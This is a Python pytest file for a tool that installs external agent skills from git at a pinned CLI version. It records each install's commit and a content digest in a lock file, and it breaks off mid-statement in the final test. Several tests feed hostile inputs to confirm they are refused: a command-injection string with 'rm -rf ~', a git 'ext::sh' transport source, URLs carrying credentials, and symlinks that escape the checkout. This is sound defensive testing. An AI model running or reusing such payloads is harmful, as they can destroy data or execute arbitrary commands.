# Copyright 2026 Sumith Ramsookbhai. Licensed under Apache-2.0 (see LICENSE).
"""Skills CLI pin + installation provenance for external skills (#513).

Every subprocess here is faked: `subprocess.run` is replaced by a dispatcher
that plays the pinned Skills CLI and git (clone / rev-parse / checkout), so no
test downloads or executes a real npm package. sumo-qa clones and checks out
the commit itself and hands the CLI only a local path. The end-to-end test
drives real git against a local repository (served as an https:// remote via
`insteadOf`) and a fake `npx` that copies from the path it is given, so the
argv, the pinned commit, and the lock file are exercised through real process
boundaries without network access.
"""

from __future__ import annotations

import contextlib
import json
import os
import re
import shutil
import subprocess
import sys
import threading
from pathlib import Path

import pytest

from sumo_qa import external_skills as ext
from sumo_qa.server_schemas import (
    ExecuteExternalSkillOutput,
    InstallExternalSkillOutput,
    SearchExternalSkillsOutput,
)

SHA = "0123456789abcdef0123456789abcdef01234567"
OTHER_SHA = "fedcba9876543210fedcba9876543210fedcba98"
PINNED_SPEC = f"skills@{ext.SKILLS_CLI_VERSION}"


def _completed(command, stdout: str = "", stderr: str = "", returncode: int = 0):
    return subprocess.CompletedProcess(
        args=command, returncode=returncode, stdout=stdout, stderr=stderr
    )


@pytest.fixture(autouse=True)
def _reset_cli_probe_cache():
    ext._VERIFIED_CLI_PATHS.clear()
    yield
    ext._VERIFIED_CLI_PATHS.clear()


class FakeToolchain:
    """Plays `npx skills@<pin>` and git (clone / rev-parse / checkout)."""

    def __init__(self, cwd: Path, *, version: str | None = None, remote_sha: str = SHA):
        self.cwd = cwd
        self.version = ext.SKILLS_CLI_VERSION if version is None else version
        self.remote_sha = remote_sha
        # Revisions that exist in the fake remote (each resolves to remote_sha).
        self.known_refs = {"HEAD", "refs/remotes/origin/main", "refs/tags/v1.2.0"}
        self.writes_skill = True  # False: the CLI "succeeds" but installs nothing
        self.links_claude_dir = False  # True: also symlink .claude/skills/<skill>
        self.during_add = None  # optional callback run while the CLI "installs"
        self.on_clone = None  # optional callback(checkout) populating the clone
        self.add_sources: list[tuple[str, bool]] = []  # (path given, was a dir)
        self.calls: list[tuple[list[str], dict]] = []
        self._lock = threading.Lock()

    def __call__(self, command, **kwargs):
        with self._lock:
            self.calls.append((list(command), kwargs))
        if command[0].endswith("git"):
            return self._git(command)
        if command[-1] == "--version":
            return _completed(command, stdout=f"{self.version}\n")
        if "add" in command:
            source = command[command.index("add") + 1]
            self.add_sources.append((source, Path(source).is_dir()))
        if "add" in command and self.during_add:
            self.during_add()
        if "add" in command and self.writes_skill:
            # skills@1.7.0 names the folder sanitizeName(name) (lowercased) and
            # rm -rf's then recreates it on every install (cleanAndCreateDirectory).
            skill = command[command.index("--skill") + 1]
            folder = re.sub(r"[^a-z0-9._]+", "-", skill.lower()).strip(".-")
            skill_dir = self.cwd / ".agents" / "skills" / folder
            shutil.rmtree(skill_dir, ignore_errors=True)
            (skill_dir / "references").mkdir(parents=True)
            (skill_dir / "SKILL.md").write_text(f"---\nname: {skill}\n---\n# Body\n", "utf-8")
            (skill_dir / "references" / "notes.md").write_text("notes\n", "utf-8")
            if self.links_claude_dir:
                link = self.cwd / ".claude" / "skills" / folder
                link.parent.mkdir(parents=True, exist_ok=True)
                if link.is_symlink():
                    link.unlink()
                link.symlink_to(skill_dir, target_is_directory=True)
            return _completed(command, stdout="installed")
        if "add" in command:
            return _completed(command, stdout="installed")
        return _completed(command, stdout="owner/repo@skill  3 installs\n")

    def _git(self, command):
        verb = command[3] if command[1] == "-C" else command[1]
        if verb == "clone":
            Path(command[-1]).mkdir(parents=True)
            if self.on_clone:
                self.on_clone(Path(command[-1]))
            return _completed(command)
        if verb == "rev-parse":
            revision = command[-1].removesuffix("^{commit}")
            if revision in self.known_refs:
                return _completed(command, stdout=f"{self.remote_sha}\n")
            if re.fullmatch(r"[0-9a-f]{40}", revision):
                return _completed(command, stdout=f"{revision}\n")
            return _completed(command, returncode=128)
        return _completed(command)  # checkout

    def git_commands(self, verb: str) -> list[list[str]]:
        return [
            c
            for c, _ in self.calls
            if c[0].endswith("git") and verb in (c[1], c[3] if len(c) > 3 else None)
        ]

    def cli_commands(self) -> list[list[str]]:
        return [c for c, _ in self.calls if not c[0].endswith("git")]


@pytest.fixture
def toolchain(monkeypatch, tmp_path: Path) -> FakeToolchain:
    fake = FakeToolchain(tmp_path / "project")
    fake.cwd.mkdir()
    monkeypatch.setattr(ext.shutil, "which", lambda name: f"/opt/bin/{name}")
    monkeypatch.setattr(ext.subprocess, "run", fake)
    return fake


def _install(toolchain: FakeToolchain, **kwargs):
    kwargs.setdefault("skill", "find-skills")
    kwargs.setdefault("source", "vercel-labs/skills")
    kwargs.setdefault("confirmed", True)
    kwargs.setdefault("cwd", toolchain.cwd)
    kwargs.setdefault("home", toolchain.cwd.parent / "home")
    return ext.install_external_skill(**kwargs)


def _lock(base: Path) -> dict:
    return json.loads((base / ".sumo-qa" / "external-skills.lock.json").read_text("utf-8"))


# ---------------------------------------------------------------------------
# The pin itself
# ---------------------------------------------------------------------------


def test_pin_is_an_exact_reviewed_version() -> None:
    """Moving the pin is a deliberate, reviewed change: this literal must move
    with it, in the same PR (see docs/DEVELOPMENT.md, "Skills CLI pin")."""
    assert ext.SKILLS_CLI_PACKAGE == "skills"
    assert ext.SKILLS_CLI_VERSION == "1.7.0"
    assert ext.skills_cli_identity() == {
        "package": "skills",
        "version": "1.7.0",
        "spec": "skills@1.7.0",
    }


def test_command_builder_pins_the_package_spec() -> None:
    command = ext.build_skills_cli_command("/opt/bin/npx", ["find", "a b"])

    assert command == ["/opt/bin/npx", "--yes", "skills@1.7.0", "find", "a b"]
    assert "skills" not in command


@pytest.mark.parametrize("pin", ["latest", "^1.7.0", "~1.7.0", "1.7", "1.x", "", " 1.7.0", "next"])
def test_command_builder_refuses_a_non_exact_pin(monkeypatch, pin) -> None:
    """A floating pin would let npx resolve whatever is newest: refuse it
    rather than build a command that silently runs latest."""
    monkeypatch.setattr(ext, "SKILLS_CLI_VERSION", pin)

    with pytest.raises(ext.SkillsCLIVersionError, match="exact"):
        ext.build_skills_cli_command("/opt/bin/npx", ["find", "x"])


def test_every_cli_subprocess_uses_the_pinned_spec(toolchain) -> None:
    ext.search_external_skills("mypy")
    _install(toolchain)

    commands = toolchain.cli_commands()
    assert commands, "expected Skills CLI invocations"
    for command in commands:
        assert command[:3] == ["/opt/bin/npx", "--yes", PINNED_SPEC]
        assert "skills" not in command
        assert "latest" not in " ".join(command)


def test_cli_version_mismatch_is_typed_and_blocks_the_call(toolchain) -> None:
    toolchain.version = "1.8.0"

    with pytest.raises(ext.SkillsCLIVersionError, match=r"skills@1\.7\.0.*1\.8\.0"):
        ext.search_external_skills("mypy")

    assert not any(c[3:4] == ["find"] for c in toolchain.cli_commands())


def test_cli_version_probe_runs_once_per_npx(toolchain) -> None:
    ext.search_external_skills("one")
    ext.search_external_skills("two")

    probes = [c for c in toolchain.cli_commands() if c[-1] == "--version"]
    assert len(probes) == 1


def test_search_returns_the_cli_identity(toolchain) -> None:
    result = ext.search_external_skills("mypy")

    assert result["cli"] == ext.skills_cli_identity()
    assert result["command"] == ["/opt/bin/npx", "--yes", PINNED_SPEC, "find", "mypy"]


def test_cli_runs_without_a_shell_so_arguments_are_not_reinterpreted(toolchain) -> None:
    ext.search_external_skills('"; rm -rf ~ #')

    command, kwargs = toolchain.calls[-1]
    assert command[-1] == '"; rm -rf ~ #'
    assert not kwargs.get("shell")


# ---------------------------------------------------------------------------
# Source resolution
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("source", "remote_url", "ref"),
    [
        ("vercel-labs/skills", "https://github.com/vercel-labs/skills.git", None),
        ("vercel-labs/skills.git", "https://github.com/vercel-labs/skills.git", None),
        ("https://github.com/vercel-labs/skills", "https://github.com/vercel-labs/skills", None),
        ("https://github.com/o/r.git#v1.2.0", "https://github.com/o/r.git", "v1.2.0"),
        ("git@github.com:o/r.git#main", "git@github.com:o/r.git", "main"),
        ("ssh://git@host.example:2222/o/r.git", "ssh://git@host.example:2222/o/r.git", None),
        # sumo-qa clones exactly this URL, so no CLI host rewrite can apply.
        ("https://mirror.corp/github.com/o/r.git", "https://mirror.corp/github.com/o/r.git", None),
        ("https://gitlab.example/group/sub/r", "https://gitlab.example/group/sub/r", None),
    ],
)
def test_install_checks_out_the_commit_itself_and_hands_the_cli_a_local_path(
    toolchain, source, remote_url, ref
) -> None:
    result = _install(toolchain, source=source)

    [clone] = toolchain.git_commands("clone")
    assert clone[1:6] == ["clone", "--no-checkout", "--filter=blob:none", "--quiet", "--"]
    assert clone[6] == remote_url
    [checkout] = toolchain.git_commands("checkout")
    assert checkout[-2:] == ["--detach", SHA]
    [(add_source, was_dir)] = toolchain.add_sources
    assert was_dir and Path(add_source) == Path(clone[7])
    assert "#" not in add_source and "://" not in add_source
    assert not Path(clone[7]).exists()  # the temporary checkout is removed
    assert result["provenance"]["source"] == remote_url
    assert result["provenance"]["resolved_ref"] == SHA
    assert result["provenance"]["requested_ref"] == ref


def test_git_runs_non_interactively_with_an_allow_listed_transport(toolchain) -> None:
    _install(toolchain)

    git_kwargs = [k for c, k in toolchain.calls if c[0].endswith("git")]
    assert git_kwargs
    for kwargs in git_kwargs:
        assert kwargs["env"]["GIT_TERMINAL_PROMPT"] == "0"
        assert kwargs["env"]["GIT_ALLOW_PROTOCOL"] == "https:ssh:file"
        assert not kwargs.get("shell")


def test_a_named_ref_prefers_a_tag_then_a_remote_branch(toolchain) -> None:
    _install(toolchain, source="o/r#main")

    revisions = [c[-1] for c in toolchain.git_commands("rev-parse")]
    assert revisions == ["refs/tags/main^{commit}", "refs/remotes/origin/main^{commit}"]
    for command in toolchain.git_commands("rev-parse"):
        assert command[3:7] == ["rev-parse", "--verify", "--quiet", "--end-of-options"]


def test_a_full_commit_sha_ref_must_exist_in_the_clone(toolchain) -> None:
    result = _install(toolchain, source=f"vercel-labs/skills#{OTHER_SHA.upper()}")

    assert [c[-1] for c in toolchain.git_commands("rev-parse")] == [f"{OTHER_SHA}^{{commit}}"]
    assert result["provenance"]["resolved_ref"] == OTHER_SHA


def test_search_result_shorthand_with_skill_suffix_is_accepted(toolchain) -> None:
    result = _install(toolchain, source="vercel-labs/skills@find-skills")

    assert toolchain.git_commands("clone")[0][6] == "https://github.com/vercel-labs/skills.git"
    assert result["provenance"]["source"] == "https://github.com/vercel-labs/skills.git"


def test_shorthand_naming_another_skill_is_rejected(toolchain) -> None:
    with pytest.raises(ValueError, match="names skill 'other'"):
        _install(toolchain, source="vercel-labs/skills@other")

    assert toolchain.calls == []


@pytest.mark.parametrize(
    "skill",
    ["-g", "--all", "*", "a*", "../x", "a/b", "a\\b", ".hidden", "D:evil", "a\x00b", "\x1b[2J"],
)
def test_skill_names_that_would_act_as_cli_flags_or_paths_are_rejected(toolchain, skill) -> None:
    with pytest.raises(ValueError, match="skill name"):
        _install(toolchain, skill=skill)

    assert toolchain.calls == []


def test_frontmatter_style_names_with_spaces_are_accepted(toolchain) -> None:
    """The CLI's --skill takes a frontmatter name, which may contain spaces;
    only what acts as a flag, wildcard, or path is refused."""
    assert (
        ext.check_external_skill_installed(
            "My Skill", cwd=toolchain.cwd, home=toolchain.cwd.parent / "home"
        )
        is None
    )

    result = _install(toolchain, skill="My Skill")

    add = next(c for c in toolchain.cli_commands() if "add" in c)
    assert add[add.index("--skill") + 1] == "My Skill"
    assert result["provenance"]["path"] == ".agents/skills/my-skill"


@pytest.mark.parametrize("agent", ["*", "-g", "--agent", "a b"])
def test_agent_names_that_would_act_as_cli_flags_are_rejected(toolchain, agent) -> None:
    with pytest.raises(ValueError, match="agent name"):
        _install(toolchain, agent=agent)

    assert toolchain.calls == []


@pytest.mark.parametrize(
    "source",
    [
        "./local/skills",
        "/abs/path/skills",
        "github:o/r",
        "o/r#",
        "o/r/sub/path",
        "file:///srv/skills",
        "http://host.example/o/r.git",  # plain http is not accepted
        "ext::sh -c touch% /tmp/pwned",
        # Credentials would be written into the lock file and argv.
        "https://user:token@gitlab.example/o/r.git",
        "https://ghp_token@github.com/o/r",
        "ssh://user:password@host.example/o/r.git",
        "https://gitlab.example/g/r.git?private_token=secret",
        "https://dev.azure.com/o/p/_git/r?version=GBmain",
        "https://host.example/o/../r.git",
        "https://host.example/o r.git",
        # Refs that git would read as an option or a range.
        "o/r#-x",
        "o/r#a..b",
    ],
)
def test_unaccepted_sources_are_rejected_before_anything_runs(toolchain, source) -> None:
    with pytest.raises(ValueError, match="source"):
        _install(toolchain, source=source)

    assert toolchain.calls == []


@pytest.mark.skipif(os.name == "nt", reason="creating symlinks needs privileges on Windows")
@pytest.mark.parametrize("target", ["outside", "git-metadata"])
def test_a_checkout_linking_outside_its_commit_is_refused_before_the_cli_runs(
    toolchain, tmp_path, target
) -> None:
    """The CLI copies a local source by dereferencing links, so a link out of
    the checkout (or into .git) would install bytes that no commit holds."""
    outside = tmp_path / "host-file"
    outside.write_text("host bytes", "utf-8")

    def populate(checkout: Path) -> None:
        (checkout / ".git").mkdir()
        (checkout / ".git" / "config").write_text("[core]", "utf-8")
        skill = checkout / "skills" / "find-skills"
        skill.mkdir(parents=True)
        (skill / "SKILL.md").write_text("# x", "utf-8")
        (skill / "inside").symlink_to(skill / "SKILL.md")  # stays in the commit
        leak = outside if target == "outside" else checkout / ".git" / "config"
        (skill / "leak").symlink_to(leak)

    toolchain.on_clone = populate

    with pytest.raises(ext.ExternalSkillProvenanceError, match="outside"):
        _install(toolchain)

    assert toolchain.add_sources == []


def test_unknown_remote_ref_is_a_typed_resolution_error(toolchain) -> None:
    with pytest.raises(ext.SourceResolutionError, match="nope"):
        _install(toolchain, source="o/r#nope")

    assert toolchain.add_sources == []


@pytest.mark.parametrize("failing_verb", ["clone", "checkout"])
def test_a_failing_git_step_is_a_typed_resolution_error(
    monkeypatch, toolchain, failing_verb
) -> None:
    """Offline, not a repository (a release/raw/tree URL), or a missing blob:
    every git failure is typed, and the CLI never runs."""

    def failing(command, **kwargs):
        if command[0].endswith("git") and failing_verb in command:
            return _completed(command, stderr="fatal: unable to access", returncode=128)
        return toolchain(command, **kwargs)

    monkeypatch.setattr(ext.subprocess, "run", failing)

    with pytest.raises(ext.SourceResolutionError, match="unable to access"):
        _install(toolchain)

    assert toolchain.add_sources == []


def test_git_timeout_is_a_typed_resolution_error(monkeypatch, toolchain) -> None:
    def slow(command, **kwargs):
        raise subprocess.TimeoutExpired(command, kwargs["timeout"])

    monkeypatch.setattr(ext.subprocess, "run", slow)

    with pytest.raises(ext.SourceResolutionError, match="timed out"):
        _install(toolchain)


def test_missing_git_is_a_typed_error(monkeypatch, toolchain) -> None:
    monkeypatch.setattr(ext.shutil, "which", lambda name: None if name == "git" else f"/b/{name}")

    with pytest.raises(ext.GitNotFoundError, match="git not found"):
        _install(toolchain)


# ---------------------------------------------------------------------------
# The provenance record
# ---------------------------------------------------------------------------


def test_install_records_immutable_provenance_in_the_project_lock(toolchain) -> None:
    result = _install(toolchain, agent="claude-code")

    lock = _lock(toolchain.cwd)
    assert lock["schema_version"] == 1
    record = lock["skills"][".agents/skills/find-skills"]
    assert record == result["provenance"]
    assert record["skill"] == "find-skills"
    assert record["source"] == "https://github.com/vercel-labs/skills.git"
    assert record["resolved_ref"] == SHA
    assert record["agent"] == "claude-code"
    assert record["scope"] == "project"
    assert record["path"] == ".agents/skills/find-skills"
    assert record["installer"] == ext.skills_cli_identity()
    assert re.fullmatch(r"sha256:[0-9a-f]{64}", record["content_digest"])
    assert re.fullmatch(r"\d{4}-\d\d-\d\dT\d\d:\d\d:\d\d(\.\d+)?\+00:00", record["installed_at"])
    assert result["cli"] == ext.skills_cli_identity()


def test_content_digest_covers_every_file_in_the_skill_folder(toolchain) -> None:
    first = _install(toolchain)["provenance"]["content_digest"]
    notes = toolchain.cwd / ".agents" / "skills" / "find-skills" / "references" / "notes.md"
    folder = notes.parent.parent

    assert ext.skill_content_digest(folder) == first
    notes.write_text("changed\n", "utf-8")
    assert ext.skill_content_digest(folder) != first
    notes.write_text("notes\n", "utf-8")
    notes.rename(folder / "references" / "renamed.md")
    assert ext.skill_content_digest(folder) != first


def test_global_install_records_under_home(toolchain, tmp_path) -> None:
    home = tmp_path / "home"
    toolchain.cwd = home  # the CLI installs a global skill under $HOME
    _install(toolchain, scope="global", home=home, cwd=tmp_path / "project")

    add = next(c for c in toolchain.cli_commands() if "add" in c)
    assert add[-1] == "-g"
    assert _lock(home)["skills"][".agents/skills/find-skills"]["scope"] == "global"
    assert not (tmp_path / "project" / ".sumo-qa").exists()


def test_reinstall_replaces_the_record_and_keeps_others(toolchain) -> None:
    _install(toolchain, skill="alpha")
    _install(toolchain, skill="beta")
    toolchain.remote_sha = OTHER_SHA
    _install(toolchain, skill="alpha")

    skills = _lock(toolchain.cwd)["skills"]
    assert set(skills) == {".agents/skills/alpha", ".agents/skills/beta"}
    assert skills[".agents/skills/alpha"]["resolved_ref"] == OTHER_SHA
    assert skills[".agents/skills/beta"]["resolved_ref"] == SHA


def test_cli_runs_in_the_project_directory(toolchain) -> None:
    _install(toolchain)

    add_kwargs = next(k for c, k in toolchain.calls if "add" in c)
    assert Path(add_kwargs["cwd"]) == toolchain.cwd


def test_install_without_a_discoverable_skill_is_a_provenance_error(toolchain) -> None:
    toolchain.writes_skill = False

    with pytest.raises(ext.ExternalSkillProvenanceError, match="not found"):
        _install(toolchain)

    assert not (toolchain.cwd / ".sumo-qa" / "external-skills.lock.json").exists()


def _stale_codex_copy(toolchain: FakeToolchain) -> Path:
    stale = toolchain.cwd / ".codex" / "skills" / "find-skills" / "SKILL.md"
    stale.parent.mkdir(parents=True)
    stale.write_text("# an older hand-copied version\n", "utf-8")
    return stale


def test_install_records_the_folder_the_cli_wrote_not_a_stale_copy(toolchain) -> None:
    """The pinned CLI installs a codex project skill into .agents/skills, while
    the locator checks .codex/skills first. The record must describe what this
    install wrote, never a pre-existing copy that happens to be found first."""
    _stale_codex_copy(toolchain)

    result = _install(toolchain, agent="codex")

    assert list(_lock(toolchain.cwd)["skills"]) == [".agents/skills/find-skills"]
    assert result["provenance"]["path"] == ".agents/skills/find-skills"
    assert result["installed"]["path"].endswith(".agents/skills/find-skills/SKILL.md")


def test_reinstall_with_a_stale_copy_still_records_what_the_cli_rewrote(toolchain) -> None:
    _install(toolchain)
    _stale_codex_copy(toolchain)

    _install(toolchain)

    assert list(_lock(toolchain.cwd)["skills"]) == [".agents/skills/find-skills"]


def test_cli_that_writes_nothing_scanned_never_vouches_for_an_existing_copy(toolchain) -> None:
    """Only folders this install created or rewrote are recorded: an untouched
    copy is never vouched for, even when it is the only one found."""
    _stale_codex_copy(toolchain)
    toolchain.writes_skill = False

    with pytest.raises(ext.ExternalSkillProvenanceError, match="not found"):
        _install(toolchain)


def test_mixed_case_skill_name_records_the_lowercased_folder_the_cli_wrote(toolchain) -> None:
    stale = toolchain.cwd / ".codex" / "skills" / "Find-Skills" / "SKILL.md"
    stale.parent.mkdir(parents=True)
    stale.write_text("# stale\n", "utf-8")

    result = _install(toolchain, skill="Find-Skills")

    assert result["provenance"]["path"] == ".agents/skills/find-skills"
    assert list(_lock(toolchain.cwd)["skills"]) == [".agents/skills/find-skills"]


@pytest.mark.skipif(os.name == "nt", reason="creating symlinks needs privileges on Windows")
def test_every_location_the_install_wrote_is_recorded(toolchain) -> None:
    toolchain.links_claude_dir = True

    _install(toolchain, agent="claude-code")

    skills = _lock(toolchain.cwd)["skills"]
    assert set(skills) == {".agents/skills/find-skills", ".claude/skills/find-skills"}
    assert len({record["content_digest"] for record in skills.values()}) == 1

    _install(toolchain, agent="claude-code")  # unchanged reinstall of linked copies
    result = ext.execute_external_skill(
        "find-skills", cwd=toolchain.cwd, home=toolchain.cwd.parent / "home"
    )
    assert result["provenance"]["status"] == "verified"


def test_a_record_written_by_a_concurrent_install_is_kept(toolchain) -> None:
    def other_installer_finishes():
        lock_path = toolchain.cwd / ".sumo-qa" / "external-skills.lock.json"
        lock_path.parent.mkdir(parents=True, exist_ok=True)
        other = {"schema_version": 1, "skills": {".agents/skills/other": {"skill": "other"}}}
        lock_path.write_text(json.dumps(other), "utf-8")

    toolchain.during_add = other_installer_finishes

    _install(toolchain)

    assert set(_lock(toolchain.cwd)["skills"]) == {
        ".agents/skills/other",
        ".agents/skills/find-skills",
    }


def test_concurrent_installs_are_serialised_and_keep_every_record(toolchain) -> None:
    errors: list[BaseException] = []

    def install(skill):
        try:
            _install(toolchain, skill=skill)
        except BaseException as exc:  # noqa: BLE001 - surfaced by the assert below
            errors.append(exc)

    threads = [threading.Thread(target=install, args=(f"s{i}",)) for i in range(6)]
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()

    assert errors == []
    assert set(_lock(toolchain.cwd)["skills"]) == {f".agents/skills/s{i}" for i in range(6)}


@pytest.mark.skipif(os.name == "nt", reason="the test holds the guard with fcntl")
def test_a_held_guard_times_out_typed_and_frees_when_its_holder_goes(
    monkeypatch, toolchain
) -> None:
    import fcntl

    monkeypatch.setattr(ext, "_LOCK_WAIT_SECONDS", 0.2)
    guard = toolchain.cwd / ".sumo-qa" / "external-skills.lock.json.lock"
    guard.parent.mkdir()
    holder = os.open(guard, os.O_RDWR | os.O_CREAT)
    fcntl.flock(holder, fcntl.LOCK_EX)

    with pytest.raises(ext.ExternalSkillProvenanceError, match="busy"):
        _install(toolchain)
    assert toolchain.add_sources == []  # nothing is installed while the guard is held

    os.close(holder)  # a crashed holder releases its lock with its descriptor
    _install(toolchain)


def test_an_uncreatable_lock_folder_is_a_typed_error(toolchain) -> None:
    (toolchain.cwd / ".sumo-qa").write_text("a file where the folder should be", "utf-8")

    with pytest.raises(ext.ExternalSkillReadError, match="could not lock"):
        _install(toolchain)


@pytest.mark.skipif(os.name == "nt", reason="creating symlinks needs privileges on Windows")
def test_a_symlinked_lock_folder_is_refused(toolchain, tmp_path) -> None:
    elsewhere = tmp_path / "elsewhere"
    elsewhere.mkdir()
    (toolchain.cwd / ".sumo-qa").symlink_to(elsewhere, target_is_directory=True)

    with pytest.raises(ext.ExternalSkillProvenanceError, match="symlink"):
        _install(toolchain)

    assert list(elsewhere.iterdir()) == []


def test_a_lock_folder_reported_as_a_symlink_is_refused_on_every_platform(
    monkeypatch, toolchain
) -> None:
    real_is_symlink = Path.is_symlink
    monkeypatch.setattr(
        ext.Path, "is_symlink", lambda self: self.name == ".sumo-qa" or real_is_symlink(self)
    )

    with pytest.raises(ext.ExternalSkillProvenanceError, match="symlink"):
        _install(toolchain)


@pytest.mark.parametrize("failure", ["record", "digest"])
def test_an_install_that_cannot_be_recorded_is_rolled_back(monkeypatch, toolchain, failure) -> None:
    """An install sumo-qa made but could not record must not stay behind as an
    'unrecorded' skill that executes without verification."""

    if failure == "record":

        def fail(*args, **kwargs):
            raise OSError(28, "No space left on device")

        monkeypatch.setattr(ext, "_write_atomic", fail)
    else:
        real_read_bytes = Path.read_bytes

        def unreadable_after_install(self):
            if "references" in self.parts:
                raise PermissionError("denied")
            return real_read_bytes(self)

        monkeypatch.setattr(ext.Path, "read_bytes", unreadable_after_install)

    with pytest.raises(ext.ExternalSkillProvenanceError, match="rolled back") as excinfo:
        _install(toolchain)

    cause = excinfo.value.__cause__
    assert isinstance(
        cause,
        ext.ExternalSkillProvenanceError if failure == "record" else ext.ExternalSkillReadError,
    )

    assert not (toolchain.cwd / ".agents" / "skills" / "find-skills").exists()
    with pytest.raises(ext.ExternalSkillError, match="not installed"):
        _execute(toolchain)


def test_rollback_survives_a_written_folder_that_already_vanished(monkeypatch, toolchain) -> None:
    def folder_vanishes_then_digest_fails(written, *args):
        shutil.rmtree(written[0].path.parent)
        raise ext.ExternalSkillReadError("could not read: gone")

    monkeypatch.setattr(ext, "_provenance_records", folder_vanishes_then_digest_fails)

    with pytest.raises(ext.ExternalSkillProvenanceError, match="rolled back"):
        _install(toolchain)


def test_a_rollback_that_leaves_files_behind_says_so(monkeypatch, toolchain) -> None:
    monkeypatch.setattr(
        ext, "_write_atomic", lambda *a, **k: (_ for _ in ()).throw(OSError("full"))
    )
    monkeypatch.setattr(ext, "_remove_install", lambda folder: None)  # removal fails silently

    with pytest.raises(ext.ExternalSkillProvenanceError, match="remain") as excinfo:
        _install(toolchain)

    assert ".agents/skills/find-skills" in str(excinfo.value).replace(os.sep, "/")
    assert "rolled back" not in str(excinfo.value)


def test_a_permission_copy_failure_after_the_lock_is_written_keeps_the_install(
    monkeypatch, toolchain
) -> None:
    def no_chmod(*args, **kwargs):
        raise PermissionError("chmod not supported")

    monkeypatch.setattr(ext.os, "chmod", no_chmod)

    result = _install(toolchain)

    assert _lock(toolchain.cwd)["skills"][".agents/skills/find-skills"] == result["provenance"]
    assert (toolchain.cwd / ".agents" / "skills" / "find-skills" / "SKILL.md").exists()


def test_a_lock_the_filesystem_cannot_take_is_a_typed_error(monkeypatch, toolchain) -> None:
    def no_locks(fd):
        raise OSError(37, "No locks available")

    monkeypatch.setattr(ext, "_try_lock", no_locks)

    with pytest.raises(ext.ExternalSkillReadError, match="could not lock"):
        _install(toolchain)

    assert toolchain.add_sources == []


def test_an_unlistable_folder_found_while_recording_rolls_the_install_back(
    monkeypatch, toolchain
) -> None:
    real_walk = os.walk

    def walk_with_unlistable_folder(top, onerror=None, **kwargs):
        if onerror and "find-skills" in str(top):
            onerror(PermissionError(13, "Permission denied", str(top)))
        yield from real_walk(top, onerror=onerror, **kwargs)

    monkeypatch.setattr(ext.os, "walk", walk_with_unlistable_folder)

    with pytest.raises(ext.ExternalSkillProvenanceError, match="rolled back") as excinfo:
        _install(toolchain)

    assert isinstance(excinfo.value.__cause__, ext.ExternalSkillReadError)
    assert not (toolchain.cwd / ".agents" / "skills" / "find-skills").exists()


def test_an_interrupt_while_recording_rolls_back_and_propagates_unwrapped(
    monkeypatch, toolchain
) -> None:
    def interrupted(*args, **kwargs):
        raise KeyboardInterrupt

    monkeypatch.setattr(ext, "_write_atomic", interrupted)

    with pytest.raises(KeyboardInterrupt):
        _install(toolchain)

    assert not (toolchain.cwd / ".agents" / "skills" / "find-skills").exists()


@pytest.mark.skipif(os.name == "nt", reason="the test holds the guard with fcntl")
def test_execute_waits_for_an_install_in_progress(monkeypatch, toolchain) -> None:
    import fcntl

    _install(toolchain)
    monkeypatch.setattr(ext, "_LOCK_WAIT_SECONDS", 0.2)
    holder = os.open(toolchain.cwd / ".sumo-qa" / "external-skills.lock.json.lock", os.O_RDWR)
    fcntl.flock(holder, fcntl.LOCK_EX)
    try:
        with pytest.raises(ext.ExternalSkillProvenanceError, match="busy"):
            _execute(toolchain)
    finally:
        os.close(holder)


def test_execute_locates_and_reads_the_skill_only_under_the_lock(monkeypatch, tmp_path) -> None:
    """A skill rolled back while execute waited for the lock must not be handed
    over from a read taken before the lock."""
    folder = tmp_path / ".agents" / "skills" / "demo"
    folder.mkdir(parents=True)
    (folder / "SKILL.md").write_text("# rolled back\n", "utf-8")
    (tmp_path / ".sumo-qa").mkdir()
    real_guard = ext._lock_guard

    @contextlib.contextmanager
    def rollback_finishes_while_waiting(base):
        shutil.rmtree(folder)
        with real_guard(base):
            yield

    monkeypatch.setattr(ext, "_lock_guard", rollback_finishes_while_waiting)

    with pytest.raises(ext.ExternalSkillError, match="not installed"):
        ext.execute_external_skill("demo", cwd=tmp_path, home=tmp_path / "home")


def test_execute_with_one_folder_for_project_and_home_takes_its_lock_once(tmp_path) -> None:
    folder = tmp_path / ".agents" / "skills" / "demo"
    folder.mkdir(parents=True)
    (folder / "SKILL.md").write_text("# x\n", "utf-8")
    (tmp_path / ".sumo-qa").mkdir()

    result = ext.execute_external_skill("demo", cwd=tmp_path, home=tmp_path)

    assert result["provenance"] == {"status": "unrecorded"}


def _tracking_guards(monkeypatch, refuse: Path | None = None) -> dict:
    state = {"held": 0, "max_held": 0, "bases": []}
    real_guard = ext._lock_guard

    @contextlib.contextmanager
    def tracking(base):
        state["bases"].append(base)
        if base == refuse:
            raise ext.ExternalSkillReadError(f"could not lock {base}")
        with real_guard(base):
            state["held"] += 1
            state["max_held"] = max(state["max_held"], state["held"])
            try:
                yield
            finally:
                state["held"] -= 1

    monkeypatch.setattr(ext, "_lock_guard", tracking)
    return state


def test_a_project_skill_never_touches_the_home_lock(monkeypatch, tmp_path) -> None:
    home = tmp_path / "home"
    (home / ".sumo-qa").mkdir(parents=True)
    project = tmp_path / "project"
    skill = project / ".agents" / "skills" / "demo"
    skill.mkdir(parents=True)
    (skill / "SKILL.md").write_text("# x\n", "utf-8")
    (project / ".sumo-qa").mkdir()
    state = _tracking_guards(monkeypatch, refuse=home)

    result = ext.execute_external_skill("demo", cwd=project, home=home)

    assert result["scope"] == "project"
    assert state["bases"] == [project]


def test_execute_rejects_an_unknown_scope_before_taking_any_lock(monkeypatch, tmp_path) -> None:
    (tmp_path / ".sumo-qa").mkdir()
    state = _tracking_guards(monkeypatch)

    with pytest.raises(ValueError, match="scope must be"):
        ext.execute_external_skill("demo", scope="team", cwd=tmp_path, home=tmp_path)

    assert state["bases"] == []


@pytest.mark.parametrize("tampered", [False, True])
def test_home_fallback_verifies_under_the_home_lock_only(
    monkeypatch, toolchain, tmp_path, tampered
) -> None:
    """Falling back from project to home releases the project lock first, then
    locates, reads, and verifies the home skill against the home record while
    holding only the home lock."""
    home = tmp_path / "home"
    toolchain.cwd = home  # the CLI installs a global skill under $HOME
    project = tmp_path / "project"
    (project / ".sumo-qa").mkdir(parents=True)
    _install(toolchain, scope="global", cwd=project, home=home)
    skill_md = home / ".agents" / "skills" / "find-skills" / "SKILL.md"
    if tampered:
        skill_md.write_text("tampered\n", "utf-8")
    state = _tracking_guards(monkeypatch)
    real_read = ext._read_skill_body
    reads_under = []
    monkeypatch.setattr(
